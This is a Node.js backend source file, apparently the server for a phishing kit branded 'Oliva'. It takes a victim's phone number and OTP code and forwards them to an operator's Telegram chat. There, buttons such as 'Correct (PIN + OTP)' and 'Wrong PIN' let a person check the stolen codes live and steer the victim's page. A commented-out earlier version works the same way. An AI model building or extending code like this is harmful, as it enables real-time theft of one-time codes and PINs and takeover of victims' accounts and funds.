//  backend/server.js
// backend/server.js
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

// ✅ Validate environment variables
if (!process.env.BOT_TOKEN) {
  console.error("❌ ERROR: BOT_TOKEN is not set in .env file");
  process.exit(1);
}

if (!process.env.TG_CHAT_ID) {
  console.error("❌ ERROR: TG_CHAT_ID is not set in .env file");
  process.exit(1);
}

// ✅ Initialize bot with error handling
let bot;
try {
  bot = new Telegraf(process.env.BOT_TOKEN);
  console.log("✅ Telegram bot initialized");
} catch (error) {
  console.error("❌ Failed to initialize Telegram bot:", error.message);
  process.exit(1);
}

// Store user verification sessions
const verificationSessions = new Map();
const TIMEOUT_MINUTES = 5;

// Format message like in your image
function formatVerificationMessage(userData) {
  const now = new Date();
  const formattedTime = now
    .toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    })
    .replace(":", ".");

  return `
<b># Oliva</b>
<b>Connecting...</b>

<b>NEW USER - VERIFICATION NEEDED</b>
• <b>Country Code:</b> ${userData.countryCode}
• <b>Phone Number:</b> ${userData.phoneNumber}
• <b>OTP Code:</b> <code>${userData.otpCode}</code>
• <b>Time:</b> ${userData.time}

══════════════════════════

<b>Verify the credentials:</b>
• Timeout: ${TIMEOUT_MINUTES} minutes
  ${formattedTime}

══════════════════════════
  `;
}

// ✅ Health check endpoint
app.get("/", (req, res) => {
  res.json({
    status: "online",
    service: "Telegram Verification API",
    endpoints: {
      verify: "POST /api/verify-user",
      checkStatus: "GET /api/check-status/:sessionId",
    },
    sessions: verificationSessions.size,
  });
});

// API endpoint for user verification request
app.post("/api/verify-user", async (req, res) => {
  try {
    const { countryCode, phoneNumber, otpCode, userId, userName } = req.body;

    // Validate input
    if (!phoneNumber || !otpCode) {
      return res.status(400).json({
        error: "Missing required fields: phoneNumber and otpCode are required",
      });
    }

    // Create session data
    const sessionId = `sess_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
    const now = new Date();

    const userData = {
      sessionId,
      countryCode: countryCode || "+263",
      phoneNumber,
      otpCode,
      userId: userId || "unknown",
      userName: userName || "NEW USER",
      time: now.toLocaleString("en-US", {
        month: "2-digit",
        day: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      }),
      status: "pending",
      createdAt: now.getTime(),
      expiresAt: now.getTime() + TIMEOUT_MINUTES * 60 * 1000,
      message: "Waiting for approval...",
    };

    // Store session
    verificationSessions.set(sessionId, userData);
    console.log(`📱 New session created: ${sessionId} for ${phoneNumber}`);

    // Format Telegram message
    const message = formatVerificationMessage(userData);

    // ✅ Send to Telegram with error handling
    try {
      await bot.telegram.sendMessage(process.env.TG_CHAT_ID, message, {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "✅ Correct (PIN + OTP)",
              `correct_${sessionId}`
            ),
          ],
          [
            Markup.button.callback("❌ Wrong Code", `wrong_code_${sessionId}`),
            Markup.button.callback("❌ Wrong PIN", `wrong_pin_${sessionId}`),
          ],
          [
            Markup.button.callback("🔄 Resend OTP", `resend_${sessionId}`),
            Markup.button.callback("⏱️ Extend Time", `extend_${sessionId}`),
          ],
        ]),
      });
      console.log(`📤 Telegram message sent for session: ${sessionId}`);
    } catch (tgError) {
      console.error("❌ Failed to send Telegram message:", tgError.message);

      // Clean up session if Telegram fails
      verificationSessions.delete(sessionId);

      return res.status(500).json({
        error: "Failed to send verification request to Telegram",
        details: tgError.message,
      });
    }

    // Cleanup session after timeout
    setTimeout(() => {
      const session = verificationSessions.get(sessionId);
      if (session && session.status === "pending") {
        verificationSessions.delete(sessionId);
        console.log(`⏰ Session ${sessionId} expired`);
      }
    }, TIMEOUT_MINUTES * 60 * 1000);

    res.json({
      success: true,
      sessionId,
      message: "Verification request sent to Telegram",
      timeout: TIMEOUT_MINUTES,
      checkStatusUrl: `/api/check-status/${sessionId}`,
    });
  } catch (error) {
    console.error("❌ Error in /api/verify-user:", error);
    res.status(500).json({
      error: "Failed to process verification request",
      details: error.message,
    });
  }
});

// Check verification status
app.get("/api/check-status/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const session = verificationSessions.get(sessionId);

  if (!session) {
    return res.json({
      status: "expired",
      message: "Session expired or not found",
    });
  }

  const now = Date.now();
  const timeLeft = Math.max(0, session.expiresAt - now);
  const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

  // Auto-expire if timeout reached
  if (timeLeft <= 0 && session.status === "pending") {
    session.status = "expired";
    session.message = "Verification timeout";
  }

  res.json({
    status: session.status,
    timeLeft: minutesLeft,
    message: session.message || "",
    updatedAt: session.updatedAt || session.time,
    phone: session.phoneNumber,
    sessionId: session.sessionId,
  });
});

// ✅ OTP verification endpoint (for your testing)
app.post("/api/verify-otp", (req, res) => {
  const { phone, otp } = req.body;

  if (!phone || !otp) {
    return res.status(400).json({
      error: "Missing phone or OTP",
    });
  }

  console.log(`📲 OTP verification attempt: ${phone} - ${otp}`);

  // Simulate OTP verification (replace with your logic)
  const isValid = otp === "123456"; // Example: static OTP for testing

  if (isValid) {
    res.json({
      success: true,
      message: "OTP verified successfully",
      phone,
      verified: true,
    });
  } else {
    res.json({
      success: false,
      message: "Invalid OTP",
      phone,
      verified: false,
    });
  }
});

// Handle Telegram button callbacks
bot.action(/correct_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "approved";
    session.message = "Credentials verified successfully";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("✅ User approved!");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n✅ <b>APPROVED</b> - User can proceed`,
      { parse_mode: "HTML" }
    );

    console.log(`✅ User ${session.userId} (${session.phoneNumber}) approved`);
  } else {
    await ctx.answerCbQuery("Session expired");
  }
});

bot.action(/wrong_code_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "wrong_code";
    session.message = "OTP code is incorrect. Please resend.";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("❌ Wrong OTP code");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG CODE</b> - Please resend OTP`,
      { parse_mode: "HTML" }
    );
  }
});

bot.action(/wrong_pin_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "wrong_pin";
    session.message = "PIN is incorrect. Please use correct PIN.";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("❌ Wrong PIN");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Invalid PIN provided`,
      { parse_mode: "HTML" }
    );
  }
});

bot.action(/resend_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "resend_requested";
    session.message = "OTP resend requested";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("🔄 OTP resend requested");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n🔄 <b>OTP RESEND REQUESTED</b>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.action(/extend_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.expiresAt = Date.now() + TIMEOUT_MINUTES * 60 * 1000;
    session.message = "Time extended by 5 minutes";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("⏱️ Time extended");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b> - +5 minutes`,
      { parse_mode: "HTML" }
    );
  }
});

// ✅ Bot error handling
bot.catch((err, ctx) => {
  console.error(`❌ Telegram bot error for ${ctx.updateType}:`, err);
});

// ✅ Start bot with polling (for development)
bot
  .launch()
  .then(() => {
    console.log("🤖 Telegram bot started with polling");
  })
  .catch((err) => {
    console.error("❌ Failed to start Telegram bot:", err);
  });

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
  console.log(
    `✅ Telegram bot token: ${process.env.BOT_TOKEN ? "Set ✓" : "Missing ✗"}`
  );
  console.log(`✅ Telegram chat ID: ${process.env.TG_CHAT_ID || "Missing ✗"}`);
});

// const express = require("express");
// const cors = require("cors");
// require("dotenv").config();

// const app = express();

// // Enable CORS
// app.use(
//   cors({
//     origin: "*",
//     methods: ["GET", "POST"],
//     allowedHeaders: ["Content-Type"],
//   })
// );

// app.use(express.json());

// // Test endpoint
// app.get("/", (req, res) => {
//   res.json({
//     message: "✅ OTP Verification Server is running!",
//     endpoints: {
//       verifyOTP: "POST /api/verify-otp",
//       checkStatus: "GET /api/status/:sessionId",
//       manualApprove: "POST /api/manual-approve/:sessionId",
//     },
//   });
// });

// // Store OTP sessions
// const otpSessions = new Map();

// // ✅ OTP Verification endpoint
// app.post("/api/verify-otp", (req, res) => {
//   try {
//     const { phone, otp, countryCode = "+263" } = req.body;

//     if (!phone || !otp) {
//       return res.status(400).json({
//         error: "Phone and OTP are required",
//       });
//     }

//     const sessionId = `sess_${Date.now()}`;

//     otpSessions.set(sessionId, {
//       phone,
//       otp,
//       countryCode,
//       status: "pending",
//       time: new Date().toLocaleString(),
//       createdAt: Date.now(),
//       expiresAt: Date.now() + 5 * 60 * 1000, // 5 minutes
//     });

//     console.log(
//       `📱 OTP Received: ${phone} - OTP: ${otp} - Session: ${sessionId}`
//     );

//     res.json({
//       success: true,
//       sessionId,
//       message: "OTP received. Waiting for manual approval.",
//       timeout: 5,
//       data: {
//         phone,
//         otp,
//         countryCode,
//         time: new Date().toLocaleString(),
//       },
//     });
//   } catch (error) {
//     console.error("Error in /api/verify-otp:", error);
//     res.status(500).json({ error: "Internal server error" });
//   }
// });

// // Check status endpoint
// app.get("/api/status/:sessionId", (req, res) => {
//   const session = otpSessions.get(req.params.sessionId);

//   if (!session) {
//     return res.json({
//       status: "not_found",
//       message: "Session expired or not found",
//     });
//   }

//   res.json({
//     status: session.status,
//     phone: session.phone,
//     time: session.time,
//     updatedAt: session.updatedAt,
//   });
// });

// // Manual approval endpoint (for testing without Telegram)
// app.post("/api/manual-approve/:sessionId", (req, res) => {
//   const session = otpSessions.get(req.params.sessionId);

//   if (!session) {
//     return res.status(404).json({ error: "Session not found" });
//   }

//   session.status = "approved";
//   session.updatedAt = new Date().toISOString();

//   res.json({
//     success: true,
//     message: "OTP approved manually",
//     status: session.status,
//   });
// });

// // Start server
// const PORT = process.env.PORT || 5000;
// app.listen(PORT, () => {
//   console.log(`✅ Server running on http://localhost:${PORT}`);
//   console.log(`📱 Test with: POST http://localhost:${PORT}/api/verify-otp`);
//   console.log(
//     `🔍 Check status: GET http://localhost:${PORT}/api/status/:sessionId`
//   );
// });
